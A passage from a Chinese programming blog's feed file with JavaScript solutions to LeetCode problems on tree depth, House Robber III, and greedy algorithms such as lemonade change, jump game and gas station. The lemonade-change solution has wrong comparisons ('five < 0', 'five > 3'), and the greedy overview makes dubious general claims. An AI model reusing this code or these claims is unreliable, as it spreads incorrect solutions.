<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isOneDiff</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span> wordList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>wordList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> endWord<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> level <span class="token operator">+</span> <span class="token number">1</span>                <span class="token punctuation">}</span>                queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> word<span class="token punctuation">:</span> wordList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> level<span class="token punctuation">:</span> level <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>                visitedObj<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 判断两个单词是否只有一个字母不同</span><span class="token keyword">function</span> <span class="token function">isOneDiff</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> diff <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> source<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>source<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> target<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            diff <span class="token operator">++</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>diff <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="N叉树的最大深度"><a href="#N叉树的最大深度" class="headerlink" title="N叉树的最大深度"></a>N叉树的最大深度</h2><ul><li>题目来源:<a href="https://leetcode-cn.com/problems/maximum-depth-of-n-ary-tree/" target="_blank" rel="noopener">leetcode559</a></li></ul><blockquote><p>给定一个 N 叉树，找到其最大深度。</p><p>最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// BFS</span><span class="token keyword">var</span> maxDepth <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> depthArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> node<span class="token punctuation">:</span> root<span class="token punctuation">,</span> depth<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> node<span class="token punctuation">,</span> depth <span class="token punctuation">}</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> node<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>children<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                depthArr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token punctuation">}</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> node<span class="token punctuation">:</span> node<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> depth<span class="token punctuation">:</span> depth <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>depthArr<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 递归</span><span class="token keyword">var</span> maxDepth <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> root<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        num <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> num <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="打家劫舍iii（DFS）"><a href="#打家劫舍iii（DFS）" class="headerlink" title="打家劫舍iii（DFS）"></a>打家劫舍iii（DFS）</h2><ul><li><a href="https://leetcode-cn.com/problems/house-robber-iii/" target="_blank" rel="noopener">Leetcode337</a></li><li>每个节点都设置：<strong>[不偷, 偷]</strong></li><li>当前节点被偷时，其左右孩子不能偷</li><li>当前节点未被偷时，其左右孩子可以偷，也可以不偷，取 <strong>[不偷, 偷]</strong> 的较大者</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rob <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// [不偷, 偷]</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// left 为 root 左侧子节点的[不偷值, 偷值]</span>    <span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// right 为 root 右侧子节点的[不偷值, 偷值]</span>    <span class="token keyword">let</span> right <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 每一个节点的不偷值都是： 左侧子节点的最大值 + 右侧子节点的最大值</span>    res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>left<span class="token punctuation">)</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 每一个节点的偷值都是：左侧子节点的不偷值 + 右侧子节点的不偷值 + 该节点的值</span>    res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">.</span>val <span class="token operator">+</span> left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>贪心</title>
      <link href="2020/10/28/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83/"/>
      <url>2020/10/28/%E7%AE%97%E6%B3%95-%E8%B4%AA%E5%BF%83/</url>
      
        <content type="html"><![CDATA[<ul><li>贪心算法</li><li>移掉 k 位数字</li><li>非递增顺序的最小子序列</li><li>柠檬水找零</li><li>跳跃游戏</li><li>加油站</li></ul><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>贪心算法（又称贪婪算法）是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，算法得到的是在某种意义上的局部最优解 。</p><p><strong>贪心算法一般按如下步骤进行： </strong></p><p>①建立数学模型来描述问题 。</p><p>②把求解的问题分成若干个子问题。</p><p>③对每个子问题求解，得到子问题的局部最优解 。</p><p>④把子问题的解局部最优解合成原来解问题的一个解  。</p><pre class=" language-js"><code class="language-js">贪心算法是一种对某些求最优解问题的更简单、更迅速的设计技术。贪心算法的特点是一步一步地进行，常以当前情况为基础根据某个优化测度作最优选择，而不考虑各种可能的整体情况，省去了为找最优解要穷尽所有可能而必须耗费的大量时间。贪心算法采用自顶向下，以迭代的方法做出相继的贪心选择，每做一次贪心选择，就将所求问题简化为一个规模更小的子问题，通过每一步贪心选择，可得到问题的一个最优解。虽然每一步上都要保证能获得局部最优解，但由此产生的全局解有时不一定是最优的，所以贪心算法不要回溯</code></pre><p><strong>存在的问题</strong></p><ul><li>不能保证求得的最后解是最佳的</li><li>不能用来求最大值或最小值的问题</li><li>只能求满足某些约束条件的可行解的范围</li></ul><h2 id="移掉-k-位数字"><a href="#移掉-k-位数字" class="headerlink" title="移掉 k 位数字"></a>移掉 k 位数字</h2><p>具体看 <a href="https://www.jinjingxuan.com/2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/#more" target="_blank" rel="noopener">算法-栈</a> 中的最后一题</p><h2 id="非递增顺序的最小子序列"><a href="#非递增顺序的最小子序列" class="headerlink" title="非递增顺序的最小子序列"></a>非递增顺序的最小子序列</h2><ul><li><a href="https://leetcode-cn.com/problems/minimum-subsequence-in-non-increasing-order" target="_blank" rel="noopener">leetcode1403</a></li></ul><pre class=" language-js"><code class="language-js">给你一个数组 nums，请你从中抽取一个子序列，满足该子序列的元素之和 严格 大于未包含在该子序列中的各元素之和。如果存在多个解决方案，只需返回 长度最小 的子序列。如果仍然有多个解决方案，则返回 元素之和最大 的子序列。与子数组不同的地方在于，「数组的子序列」不强调元素在原数组中的连续性，也就是说，它可以通过从数组中分离一些（也可能不分离）元素得到。注意，题目数据保证满足所有约束条件的解决方案是 唯一 的。同时，返回的答案应当按 非递增顺序 排列。示例 <span class="token number">1</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span> 解释：子序列 <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span> 和 <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span> 是最小的、满足元素之和大于其他各元素之和的子序列。但是 <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span> 的元素之和最大。 示例 <span class="token number">2</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span> 解释：子序列 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span> 的和为 <span class="token number">14</span> ，不严格大于剩下的其他元素之和（<span class="token number">14</span> <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">6</span>）。因此，<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span> 是满足题意的最小子序列。注意，元素按非递增顺序返回。  示例 <span class="token number">3</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>输出：<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span></code></pre><ul><li>数组从大到小排序</li><li>取出最大值放入 ans 中，如果不选这个最大值将不是最优解，选了之后继续进行下一步子问题的选择(贪心)</li><li>直到取出元素大于所有元素和的一半为止</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> minSubsequence <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> sum <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">let</span> tmp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">of</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">+</span><span class="token operator">=</span> i    <span class="token punctuation">}</span>    nums<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> b <span class="token operator">-</span> a<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">></span> sum<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ans <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> ans        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="柠檬水找零"><a href="#柠檬水找零" class="headerlink" title="柠檬水找零"></a>柠檬水找零</h2><ul><li><a href="https://leetcode-cn.com/problems/lemonade-change/" target="_blank" rel="noopener">leetcode860</a></li></ul><blockquote><p>在柠檬水摊上，每一杯柠檬水的售价为 5 美元。</p><p>顾客排队购买你的产品，（按账单 bills 支付的顺序）一次购买一杯。</p><p>每位顾客只买一杯柠檬水，然后向你付 5 美元、10 美元或 20 美元。你必须给每个顾客正确找零，也就是说净交易是每位顾客向你支付 5 美元。</p><p>注意，一开始你手头没有任何零钱。</p><p>如果你能给每位顾客正确找零，返回 true ，否则返回 false 。</p><p>示例 1：</p><p>输入：[5,5,5,10,20]<br>输出：true<br>解释：<br>前 3 位顾客那里，我们按顺序收取 3 张 5 美元的钞票。<br>第 4 位顾客那里，我们收取一张 10 美元的钞票，并返还 5 美元。<br>第 5 位顾客那里，我们找还一张 10 美元的钞票和一张 5 美元的钞票。<br>由于所有客户都得到了正确的找零，所以我们输出 true。</p></blockquote><ul><li>贪心算法，每次找钱，总是先找大面额的</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> lemonadeChange <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>bills<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> five <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> ten <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bill <span class="token keyword">of</span> bills<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bill <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            five<span class="token operator">++</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bill <span class="token operator">===</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>five <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                five<span class="token operator">--</span>                ten<span class="token operator">++</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>ten <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> five <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                ten<span class="token operator">--</span>                five<span class="token operator">--</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>five <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                five<span class="token operator">-</span><span class="token operator">=</span><span class="token number">3</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="跳跃游戏"><a href="#跳跃游戏" class="headerlink" title="跳跃游戏"></a>跳跃游戏</h2><ul><li><a href="https://leetcode-cn.com/problems/jump-game/" target="_blank" rel="noopener">leetcode55</a></li><li><a href="https://leetcode-cn.com/problems/jump-game/solution/tiao-yue-you-xi-by-leetcode-solution/" target="_blank" rel="noopener">题解</a></li><li>思路：从前向后遍历，维护最远跳跃距离</li></ul><blockquote><p>给定一个非负整数数组，你最初位于数组的第一个位置。</p><p>数组中的每个元素代表你在该位置可以跳跃的最大长度。</p><p>判断你是否能够到达最后一个位置。</p><p>示例 1:</p><p>输入: [2,3,1,1,4]<br>输出: true<br>解释: 我们可以先跳 1 步，从位置 0 到达 位置 1, 然后再从位置 1 跳 3 步到达最后一个位置。<br>示例 2:</p><p>输入: [3,2,1,0,4]<br>输出: false<br>解释: 无论怎样，你总会到达索引为 3 的位置。但该位置的最大跳跃长度是 0 ， 所以你永远不可能到达最后一个位置。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> canJump <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> distance <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> distance<span class="token punctuation">)</span> <span class="token punctuation">{</span>            distance <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>distance<span class="token punctuation">,</span> i <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>distance <span class="token operator">>=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="加油站"><a href="#加油站" class="headerlink" title="加油站"></a>加油站</h2><ul><li><a href="https://leetcode-cn.com/problems/gas-station/" target="_blank" rel="noopener">leetcode134</a></li></ul><blockquote><p>输入:<br>gas  = [1,2,3,4,5]<br>cost = [3,4,5,1,2]</p><p>输出: 3</p><p>解释:<br>从 3 号加油站(索引为 3 处)出发，可获得 4 升汽油。此时油箱有 = 0 + 4 = 4 升汽油<br>开往 4 号加油站，此时油箱有 4 - 1 + 5 = 8 升汽油<br>开往 0 号加油站，此时油箱有 8 - 2 + 1 = 7 升汽油<br>开往 1 号加油站，此时油箱有 7 - 3 + 2 = 6 升汽油<br>开往 2 号加油站，此时油箱有 6 - 4 + 3 = 5 升汽油<br>开往 3 号加油站，你需要消耗 5 升汽油，正好足够你返回到 3 号加油站。<br>因此，3 可为起始索引。</p></blockquote><h3 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h3><ul><li>首先计算 gas 与 cost 的差值，例如 gas  = [1,2,3,4,5]，cost = [3,4,5,1,2]，sub为 [-2, -2, -2, 3, 3]</li><li>其中 sub[i] &gt; 0  才能作为起始点</li><li>题目就变为找出sub数组中的索引值 i，从 i 开始轮一圈判断剩余油量大于0直到循环一轮结束</li><li>时间复杂度 O(n^2)</li></ul><pre class=" language-JS"><code class="language-JS">var canCompleteCircuit = function(gas, cost) {    let n = gas.length    for (let i = 0; i < n; i++) {        if (gas[i] - cost[i] >= 0) {            let count = gas[i] - cost[i]            let pos = (i + 1) % n            let flag = true            while (pos !== i) {                count += gas[pos] - cost[pos]                if (count < 0) {                    flag = false                    break                }                pos = (pos + 1) % n            }            if (!flag) continue            else return i        }    }    return -1};</code></pre><h3 id="贪心解法"><a href="#贪心解法" class="headerlink" title="贪心解法"></a>贪心解法</h3><ul><li>首先如果总油量减去总消耗大于等于零那么一定可以跑完一圈，则一定可以找到一个解（即索引i），至于为什么可以参考<a href="https://leetcode-cn.com/problems/gas-station/solution/shou-hua-tu-jie-liang-ge-guan-jian-jie-lun-de-jian/" target="_blank" rel="noopener">这篇题解</a>，如果小于零直接返回 -1</li><li>同样的每个加油站的剩余量sub[i]为gas[i] - cost[i]。</li><li>i从0开始累加sub[i]，和记为curSum，一旦curSum小于零，说明[0, i]区间都不能作为起始位置，因为小于0说明无法到达，这时起始位置从i+1算起，再从0计算curSum。</li><li>那么为什么一旦[i，j] 区间和为负数，起始位置就可以是j+1呢，j+1后面就不会出现负数？因为如果出现更大的负数，就是更新j，那么起始位置又变成新的j+1了。</li><li>时间复杂度 O(n)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> canCompleteCircuit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>gas<span class="token punctuation">,</span> cost<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 总的剩余油料</span>  <span class="token keyword">let</span> sub <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 当前站点的剩余油料</span>  <span class="token keyword">let</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 起始点</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> gas<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sub <span class="token operator">+</span><span class="token operator">=</span> gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sub <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      start <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      sub <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    total <span class="token operator">+</span><span class="token operator">=</span> gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> total <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span> start<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈的应用</title>
      <link href="2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/"/>
      <url>2020/10/22/%E7%AE%97%E6%B3%95-%E6%A0%88/</url>
      
